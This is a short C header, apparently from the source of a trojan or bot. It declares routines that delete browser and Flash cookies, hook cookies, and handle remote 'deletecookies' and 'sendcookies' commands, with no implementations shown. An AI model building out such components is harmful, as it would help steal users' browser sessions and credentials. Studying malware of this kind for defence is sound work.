
#ifndef coocksolH
#define coocksolH
//----------------------------------------------------------------------------

#include "windows.h"

// Фцнкция удаляет кукисы браузеров и Macromedia Flash Player
void DeleteBrowsersCookies();
void StartDeleteCookiesThread();

bool DeleteIECookies();
bool DeleteFFCookies();
bool DeleteSOL();

bool ExecuteDeleteCookiesCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
bool ExecuteSendCookiesCommand(LPVOID Manager, PCHAR Command, PCHAR Args);

const char CommandDeleteCookies[] = "deletecookies\0";//{'d', 'c', 0};
const char CommandSendCookies[] = "sendcookies\0";
// Функции работы с ие, в разных системах
BOOL Delete_IECookies_Norm(BOOL bDeleteCookies, BOOL bDeleteCookiesIndex);
BOOL Delete_IECookies_Vista();
bool HookCookie();
bool ExecuteDellCookSol();
//bool ExecuteDellCookSol(LPVOID Manager, PCHAR Command, PCHAR Args);//сама команда
//const char CommandCookSol[]		= {'d','e','l','c','o','o','k','i','e',0};

//----------------------------------------------------------------------------
#endif


